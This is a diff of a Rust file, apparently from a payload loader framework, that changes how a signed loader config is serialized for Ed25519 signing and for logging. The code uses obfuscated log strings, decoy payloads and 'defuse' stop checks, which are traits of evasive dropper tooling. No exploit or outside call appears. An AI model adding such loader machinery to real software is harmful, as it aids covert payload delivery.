@@ -27,13 +27,13 @@ use log::debug;
 use log::info;
 use log::warn;
 
-#[derive(Serialize, Deserialize, Debug, Clone)]
+#[derive(Serialize, Deserialize, Clone)]
 pub struct VerifSignMaterial {
     pub peer_public_key_bytes: Vec<u8>,
     pub sign_bytes: Vec<u8>,
 }
 
-#[derive(Serialize, Deserialize, Debug, Clone)]
+#[derive(Serialize, Deserialize, Clone)]
 pub struct Config {
     pub update_links: BTreeMap<u64, (String, PoolLinks)>,
     pub backup_config: Vec<FileLink>,
@@ -145,17 +145,24 @@ impl Config {
         new_loader.sign_loader(key_pair);
         new_loader
     }
-
+    /* 
     pub fn return_sign_data(&self) -> String {
         let copy_loaderconf = &mut self.clone();
         copy_loaderconf.sign_material.sign_bytes = vec![];
         format!("sign_data: {:?}", copy_loaderconf)
+    }*/
+    
+    pub fn return_sign_data(&self) -> Vec<u8> {
+        let copy_loaderconf = &mut self.clone();
+        copy_loaderconf.sign_material.sign_bytes = vec![];
+        //format!("sign_data: {:?}", copy_loaderconf)
+        serde_json::to_vec(&copy_loaderconf).unwrap()
     }
 
     pub fn sign_loader(&mut self, key_pair: &Ed25519KeyPair) {
         let peer_public_key_bytes = key_pair.public_key().as_ref().to_vec();
         let sign_data = self.return_sign_data();
-        let sig: signature::Signature = key_pair.sign(sign_data.as_bytes());
+        let sig: signature::Signature = key_pair.sign(&sign_data);
         let sign_bytes = sig.as_ref();
         let sign_material = VerifSignMaterial {
             peer_public_key_bytes: peer_public_key_bytes,
@@ -173,7 +180,7 @@ impl Config {
             &signature::ED25519,
             &self.sign_material.peer_public_key_bytes,
         );
-        peer_public_key.verify(sign_data.as_bytes(), &newconfig.sign_material.sign_bytes)
+        peer_public_key.verify(&sign_data, &newconfig.sign_material.sign_bytes)
     }
 
     pub fn new_fromfile(path_file: &str) -> Config {
@@ -184,11 +191,11 @@ impl Config {
     }
 
     pub fn print_loader(&self) {
-        debug!("{:#?}", self);
+        debug!("{}", serde_json::to_string_pretty(self).unwrap_or_default());
     }
     pub fn print_loader_compact(&self) {
         debug!("{}", encrypt_string!("print_loader_compact"));
-        debug!("{:?}", self);
+        debug!("{:?}", serde_json::to_string(self).unwrap_or_default());
     }
     pub fn serialize_to_file(&self, path_file: &str) {
         let serialized: String = self.concat_loader_jsondata();
@@ -233,11 +240,11 @@ impl Config {
         let mut nb_payload = 1;
         for payload in &self.payloads {
             info!(
-                "{}/{}{}{:?}",
+                "{}/{}{}{}",
                 nb_payload,
                 &self.payloads.len(),
                 encrypt_string!(" payload: "),
-                &payload
+                serde_json::to_string_pretty(&payload).unwrap_or_default()
             );
 
             //clean the running_thread
@@ -276,11 +283,11 @@ impl Config {
         let mut nb_payload = 1;
         for payload in &self.decoy_update_config {
             info!(
-                "{}/{}{}{:?}",
+                "{}/{}{}{}",
                 nb_payload,
                 &self.decoy_update_config.len(),
                 encrypt_string!(" decoy update payload: "),
-                &payload
+                serde_json::to_string(&payload).unwrap_or_default()
             );
 
             //clean the running_thread
@@ -321,11 +328,11 @@ impl Config {
         let mut nb_payload = 1;
         for payload in &self.decoy_payload_exec {
             info!(
-                "{}/{}{}{:?}",
+                "{}/{}{}{}",
                 nb_payload,
                 &self.decoy_payload_exec.len(),
                 encrypt_string!(" decoy exec payload: "),
-                &payload
+                serde_json::to_string(&payload).unwrap_or_default()
             );
 
             //clean the running_thread
@@ -370,7 +377,7 @@ impl Config {
                 nb_defuse,
                 defuse_list.len(),
                 encrypt_string!(" defuse: "),
-                defuse
+                serde_json::to_string(&defuse).unwrap_or_default()
             );
             if check_this_defuse {
                 if defuse.stop_the_exec(&self) {
@@ -436,7 +443,7 @@ impl Config {
 
     pub fn backup_config(&self) {
         for backup_file in &self.backup_config {
-            info!("{}{:?}", encrypt_string!("[+] backup_file: "), backup_file);
+            info!("{}{}", encrypt_string!("[+] backup_file: "), serde_json::to_string_pretty(backup_file).unwrap_or_default());
             self.backup_config_to_file(&mut backup_file.clone());
         }
     }
@@ -497,7 +504,7 @@ impl Config {
         //TODO
         let mut file_links = vec![];
         for backup_file in &self.backup_config {
-            debug!("{}{:?}", encrypt_string!("[+] backup_file: "), backup_file);
+            debug!("{}{}", encrypt_string!("[+] backup_file: "), serde_json::to_string(backup_file).unwrap_or_default());
             match calculate_path_reverse(&backup_file.file_path) {
                 Ok(possible_paths) => {
                     if possible_paths.is_empty() {
